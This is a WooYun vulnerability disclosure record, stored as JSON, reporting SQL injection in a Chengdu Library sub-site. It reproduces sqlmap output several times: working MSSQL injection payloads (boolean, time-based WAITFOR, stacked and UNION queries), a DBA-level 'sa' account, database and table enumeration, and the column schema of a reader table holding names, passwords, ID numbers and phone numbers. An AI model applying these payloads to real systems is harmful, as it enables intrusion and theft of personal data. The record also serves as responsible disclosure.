{"id": 68337, "wybug_id": "wooyun-2015-0140967", "wybug_title": "成都图书馆某分站sql注入，导致主站及多个站点信息泄露", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "不会游泳的鱼", "wybug_date": "2015-09-16 20:48", "wybug_open_date": "2015-11-02 15:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-18：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-09-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-02：\t细节向公众公开  简要描述： 成都图书馆某分站sql注入，导致主站及多个站点信息泄露，数万读者信息有泄露的风险 详细说明：  注入点：\nhttp://**.**.**.**/website/webnewsshow.aspx?tid=2321\n此为成都图书馆：\nhttp://**.**.**.**/website/\n的一个分站sqlmap轻松跑出数据库：\n\n其中cdlib为成都图书馆主站库权限为dba\n\n读者大概有5W多\n\n读者表中包括姓名、密码、手机、地址、工作地点等敏感数据不再深入，只验证，不拖库   漏洞证明：  \nsqlmap identified the following injection points with a total of 51 HTTP(s) requests:---Parameter: tid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: tid=2321 AND 4674=4674    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: tid=2321;WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: tid=2321 WAITFOR DELAY '0:0:5'    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: tid=-3969 UNION ALL SELECT NULL,CHAR(113)+CHAR(98)+CHAR(112)+CHAR(113)+CHAR(113)+CHAR(70)+CHAR(88)+CHAR(116)+CHAR(121)+CHAR(72)+CHAR(74)+CHAR(76)+CHAR(67)+CHAR(115)+CHAR(119)+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000available databases [11]:[*] Books[*] cdlib[*] czlib[*] immaterial[*] libwms[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] tempdbsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: tid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: tid=2321 AND 4674=4674    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: tid=2321;WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: tid=2321 WAITFOR DELAY '0:0:5'    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: tid=-3969 UNION ALL SELECT NULL,CHAR(113)+CHAR(98)+CHAR(112)+CHAR(113)+CHAR(113)+CHAR(70)+CHAR(88)+CHAR(116)+CHAR(121)+CHAR(72)+CHAR(74)+CHAR(76)+CHAR(67)+CHAR(115)+CHAR(119)+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000current user:    'sa'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: tid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: tid=2321 AND 4674=4674    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: tid=2321;WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: tid=2321 WAITFOR DELAY '0:0:5'    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: tid=-3969 UNION ALL SELECT NULL,CHAR(113)+CHAR(98)+CHAR(112)+CHAR(113)+CHAR(113)+CHAR(70)+CHAR(88)+CHAR(116)+CHAR(121)+CHAR(72)+CHAR(74)+CHAR(76)+CHAR(67)+CHAR(115)+CHAR(119)+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000current database:    'immaterial'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: tid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: tid=2321 AND 4674=4674    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: tid=2321;WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: tid=2321 WAITFOR DELAY '0:0:5'    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: tid=-3969 UNION ALL SELECT NULL,CHAR(113)+CHAR(98)+CHAR(112)+CHAR(113)+CHAR(113)+CHAR(70)+CHAR(88)+CHAR(116)+CHAR(121)+CHAR(72)+CHAR(74)+CHAR(76)+CHAR(67)+CHAR(115)+CHAR(119)+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000Database: cdlib[39 tables]+------------------+| ReaderTmp        || TabArea          || TabCard          || TabComputer      || TabDeleteReader  || TabDepart        || TabDicBDuty      || TabDicEmployee   || TabDicOtherCost  || TabDicPDuty      || TabDicReadCost   || TabDicStudy      || TabForfeit       || TabIncome        || TabLibInfo       || TabOperateLog    || TabOperator      || TabOtherCost     || TabPayVOD        || TabReadCost      || TabReaderKind    || TabReaderKind    || TabSystemPara    || TabTempReader    || TabTempVOD       || VIEWComputer     || VIEWDeleteReader || VIEWReadCost     || VIEWReaderCard   || VIEWReaderCard   || VIEWReaderKind   || changCard        || dtproperties     || sysconstraints   || syssegments      || viewUnFixIncome  || viewUnFixIncome  || viewfixedIncome  || viewfixedIncome  |+------------------+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: tid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: tid=2321 AND 4674=4674    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: tid=2321;WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: tid=2321 WAITFOR DELAY '0:0:5'    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: tid=-3969 UNION ALL SELECT NULL,CHAR(113)+CHAR(98)+CHAR(112)+CHAR(113)+CHAR(113)+CHAR(70)+CHAR(88)+CHAR(116)+CHAR(121)+CHAR(72)+CHAR(74)+CHAR(76)+CHAR(67)+CHAR(115)+CHAR(119)+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000Database: cdlib+----------------------+---------+| Table                | Entries |+----------------------+---------+| dbo.TabIncome        | 189955  || dbo.TabOperateLog    | 110785  || dbo.TabCard          | 58887   || dbo.VIEWReaderKind   | 56126   || dbo.VIEWReaderCard   | 55648   || dbo.VIEWReaderCard   | 55648   || dbo.VIEWReadCost     | 50310   || dbo.TabReadCost      | 50272   || dbo.ReaderTmp        | 16061   || dbo.changCard        | 8894    || dbo.TabDeleteReader  | 8746    || dbo.VIEWDeleteReader | 8744    || dbo.TabPayVOD        | 1015    || dbo.TabComputer      | 100     || dbo.VIEWComputer     | 92      || dbo.sysconstraints   | 61      || dbo.TabReaderKind    | 21      || dbo.TabReaderKind    | 21      || dbo.TabDicEmployee   | 15      || dbo.TabDicStudy      | 10      || dbo.TabOtherCost     | 9       || dbo.TabOperator      | 8       || dbo.TabDicBDuty      | 5       || dbo.TabDicPDuty      | 5       || dbo.syssegments      | 3       || dbo.TabDepart        | 3       || dbo.TabArea          | 2       || dbo.TabDicReadCost   | 1       || dbo.TabLibInfo       | 1       || dbo.TabSystemPara    | 1       |+----------------------+---------+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: tid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: tid=2321 AND 4674=4674    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: tid=2321;WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: tid=2321 WAITFOR DELAY '0:0:5'    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: tid=-3969 UNION ALL SELECT NULL,CHAR(113)+CHAR(98)+CHAR(112)+CHAR(113)+CHAR(113)+CHAR(70)+CHAR(88)+CHAR(116)+CHAR(121)+CHAR(72)+CHAR(74)+CHAR(76)+CHAR(67)+CHAR(115)+CHAR(119)+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000current user is DBA:    Truesqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: tid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: tid=2321 AND 4674=4674    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: tid=2321;WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: tid=2321 WAITFOR DELAY '0:0:5'    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: tid=-3969 UNION ALL SELECT NULL,CHAR(113)+CHAR(98)+CHAR(112)+CHAR(113)+CHAR(113)+CHAR(70)+CHAR(88)+CHAR(116)+CHAR(121)+CHAR(72)+CHAR(74)+CHAR(76)+CHAR(67)+CHAR(115)+CHAR(119)+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(120)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2000Database: cdlibTable: VIEWReaderCard[32 columns]+---------------+----------+| Column        | Type     |+---------------+----------+| Address       | varchar  || BDuty         | int      || BeginDate     | datetime || BirthYear     | datetime || CardCost      | money    || CardID        | varchar  || CardRegDate   | datetime || EndDate       | datetime || Foregift      | money    || HaveMoney     | money    || IsCancel      | bit      || IsCard        | bit      || IsDelete      | bit      || IsReadReg     | bit      || IsUse         | bit      || KindName      | varchar  || Nation        | varchar  || OtherServices | money    || PDuty         | int      || PersonalID    | varchar  || PostID        | varchar  || ReaderID      | varchar  || ReaderName    | varchar  || ReaderPwd     | varchar  || ReaderType    | int      || RegDate       | datetime || Services      | money    || Sex           | char     || Study         | int      || Telphone      | varchar  || Vocation      | int      || WorkPlace     | varchar  |+---------------+----------+\n   修复方案：  过滤   版权声明：转载请注明来源 不会游泳的鱼@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-09-18 15:21 厂商回复： CNVD确认所述情况,已经转由CNCERT下发给四川分中心,由其后续协调网站管理单位处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}